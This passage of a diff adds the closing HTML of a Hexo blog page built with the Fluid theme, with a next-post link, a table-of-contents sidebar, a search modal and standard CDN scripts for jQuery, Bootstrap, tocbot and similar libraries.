+                        <span class="hidden-mobile">如何凭实力被刚认识的女生拉黑</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
